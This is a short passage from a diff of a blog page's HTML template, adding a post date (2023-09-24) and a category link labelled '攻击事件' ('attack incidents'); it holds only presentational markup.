+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/" class="post-category">
+                                    攻击事件
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
                 </div>
                 
             </div>
